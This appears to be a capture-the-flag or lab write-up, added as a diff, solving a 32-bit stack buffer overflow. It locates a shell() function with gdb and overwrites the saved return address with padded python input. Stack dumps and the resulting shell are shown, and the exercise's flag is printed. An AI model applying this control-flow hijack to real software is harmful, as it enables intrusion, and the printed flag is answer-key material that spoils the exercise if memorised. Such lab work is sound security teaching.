@@ -1,0 +1,78 @@
+This program gives the address of shell(), but if it didn't we would do:
+
+$ gdb buffer_overflow
+
+(gdb) print shell
+
+$1 = {void (void)} 0x80485f8 <shell>
+
+(gdb) quit
+
+$ 
+
+Now we know the address of the function. Now we need to overflow this memory address into the %eip of the program.
+
+Try 1:
+
+$ ./buffer_overflow `python -c "print 'A' * 32 + '\xf8\x85\x04\x08'"`
+shell function = 0x80485f8
+Stack dump:
+0xffe11850: 0xffe1282d (first argument)
+0xffe1184c: 0x080486bc (saved eip)
+0xffe11848: 0xffe11878 (saved ebp)
+0xffe11844: 0xf77bc918
+0xffe11840: 0x08048839
+0xffe1183c: 0xf7634ab0
+0xffe11838: 0xffe11854
+0xffe11834: 0x08048839
+0xffe11830: 0xf778ba20
+0xffe1182c: 0xf7634adf
+0xffe11828: 0xffe11878
+0xffe11824: 0x00000000
+0xffe11820: 0x080485f8
+0xffe1181c: 0x41414141
+0xffe11818: 0x41414141
+0xffe11814: 0x41414141
+0xffe11810: 0x41414141
+0xffe1180c: 0x41414141
+0xffe11808: 0x41414141
+0xffe11804: 0x41414141
+0xffe11800: 0x41414141 (beginning of buffer)
+
+Note that running with 32 As does not fill up the buffer yet, so we keep going until:
+
+$ ./buffer_overflow `python -c "print 'A' * 76 + '\xf8\x85\x04\x08'"`
+shell function = 0x80485f8
+Stack dump:
+0xff8a8e90: 0xff8aa800 (first argument)
+0xff8a8e8c: 0x080485f8 (saved eip)
+0xff8a8e88: 0x41414141 (saved ebp)
+0xff8a8e84: 0x41414141
+0xff8a8e80: 0x41414141
+0xff8a8e7c: 0x41414141
+0xff8a8e78: 0x41414141
+0xff8a8e74: 0x41414141
+0xff8a8e70: 0x41414141
+0xff8a8e6c: 0x41414141
+0xff8a8e68: 0x41414141
+0xff8a8e64: 0x41414141
+0xff8a8e60: 0x41414141
+0xff8a8e5c: 0x41414141
+0xff8a8e58: 0x41414141
+0xff8a8e54: 0x41414141
+0xff8a8e50: 0x41414141
+0xff8a8e4c: 0x41414141
+0xff8a8e48: 0x41414141
+0xff8a8e44: 0x41414141
+0xff8a8e40: 0x41414141 (beginning of buffer)
+sh-4.2$
+
+(Noted I skipped to 64 after I tried 32, then skipped to 70 and continued from there because there was still a sizeable gap)
+
+Then:
+
+sh-4.2$ cat key
+controlflow_is_no_match_for_overflow
+sh-4.2$ exit
+
+Key: controlflow_is_no_match_for_overflow
